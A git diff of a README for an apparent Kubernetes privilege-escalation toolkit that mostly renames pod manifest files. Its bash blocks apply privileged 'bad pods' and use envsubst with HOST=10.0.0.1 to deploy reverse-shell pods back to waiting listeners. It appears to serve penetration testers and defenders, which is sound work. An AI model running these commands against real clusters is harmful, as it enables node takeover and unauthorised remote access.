@@ -20,14 +20,14 @@ In most situations, if you have permission to create pods, you also have permiss
 
 Notes | readme | pod | revshell
 -- | -- | -- | --
-Everything allowed | [readme](yaml/everything-allowed/) | [yaml](yaml/everything-allowed/pod-everything-allowed.yaml) | [yaml](yaml/everything-allowed/pod-everything-allowed-revshell.yaml)
+Everything allowed | [readme](yaml/everything-allowed/) | [yaml](yaml/everything-allowed/everything-allowed.yaml) | [yaml](yaml/everything-allowed/everything-allowed-revshell.yaml)
 Privileged and hostPid | [readme](yaml/priv-and-hostpid/) | [yaml](yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml) | [yaml](yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml)
 Privileged only | [readme](yaml/priv/) | [yaml](yaml/priv/pod-priv.yaml) | [yaml](yaml/priv/pod-priv-revshell.yaml)
-hostPath only | [readme](yaml/hostpath/) | [yaml](yaml/hostpath/pod-hostpath.yaml) | [yaml](yaml/hostpath/pod-hostpath-revshell.yaml)  
-hostPid only | [readme](yaml/hostpid/) | [yaml](yaml/hostpid/pod-hostpid.yaml) | [yaml](yaml/hostpid/pod-hostpid-revshell.yaml)  
-hostNetwork only | [readme](yaml/hostnetwork/) | [yaml](yaml/hostnetwork/pod-hostnetwork.yaml) | [yaml](yaml/hostnetwork/pod-hostnetwork-revshell.yaml)
-hostIPC only | [readme](yaml/hostipc/) | [yaml](yaml/hostipc/pod-hostipc.yaml) | [yaml](yaml/hostipc/pod-hostipc-revshell.yaml)
-Nothing allowed | [readme](yaml/nothing-allowed/) | [yaml](yaml/nothing-allowed/pod-nothing-allowed.yaml) | [yaml](yaml/nothing-allowed/pod-nothing-allowed-revshell.yaml)
+hostPath only | [readme](yaml/hostpath/) | [yaml](yaml/hostpath/hostpath-exec.yaml) | [yaml](yaml/hostpath/hostpath-revshell.yaml)  
+hostPid only | [readme](yaml/hostpid/) | [yaml](yaml/hostpid/hostpid.yaml) | [yaml](yaml/hostpid/hostpid-revshell.yaml)  
+hostNetwork only | [readme](yaml/hostnetwork/) | [yaml](yaml/hostnetwork/hostnetwork-exec.yaml) | [yaml](yaml/hostnetwork/hostnetwork-revshell.yaml)
+hostIPC only | [readme](yaml/hostipc/) | [yaml](yaml/hostipc/hostipc-exec.yaml) | [yaml](yaml/hostipc/hostipc-revshell.yaml)
+Nothing allowed | [readme](yaml/nothing-allowed/) | [yaml](yaml/nothing-allowed/nothing-allowed.yaml) | [yaml](yaml/nothing-allowed/nothing-allowed-revshell.yaml)
 
 
 # Impact - What's the worst that can happen?
@@ -45,14 +45,14 @@ cd badPods
 ### Create the pods (or at least try to create them)
 
 ```bash
-kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
+kubectl apply -f ./yaml/everything-allowed/everything-allowed.yaml
 kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
 kubectl apply -f ./yaml/priv/pod-priv.yaml
-kubectl apply -f ./yaml/hostpath/pod-hostpath.yaml
-kubectl apply -f ./yaml/hostpid/pod-hostpid.yaml 
-kubectl apply -f ./yaml/hostnetwork/pod-hostnetwork.yaml
-kubectl apply -f ./yaml/hostipc/pod-hostipc.yaml
-kubectl apply -f ./yaml/nothing-allowed/pod-nothing-allowed.yaml
+kubectl apply -f ./yaml/hostpath/hostpath-exec.yaml
+kubectl apply -f ./yaml/hostpid/hostpid.yaml 
+kubectl apply -f ./yaml/hostnetwork/hostnetwork-exec.yaml
+kubectl apply -f ./yaml/hostipc/hostipc-exec.yaml
+kubectl apply -f ./yaml/nothing-allowed/nothing-allowed.yaml
 
 ```
 
@@ -60,13 +60,14 @@ kubectl apply -f ./yaml/nothing-allowed/pod-nothing-allowed.yaml
 If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!
 
 ```bash
-HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/hostpid/pod-hostpid-revshell.yaml  | kubectl apply -f -
-HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/hostnetwork/pod-hostnetwork-revshell.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath/pod-hostpath-revshell.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc/pod-hostipc-revshell.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
-HOST="10.0.0.1" PORT="3117" envsubst < ./yaml/nothing-allowed/pod-nothing-allowed-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/everything-allowed/everything-allowed-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/priv/pod-priv-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath/hostpath-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostpid/hostpid-revshell.yaml  | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostnetwork/hostnetwork-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3117" envsubst < ./yaml/hostipc/hostipc-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3118" envsubst < ./yaml/nothing-allowed/nothing-allowed-revshell.yaml | kubectl apply -f -
 ```
 
 # Acknowledgements 
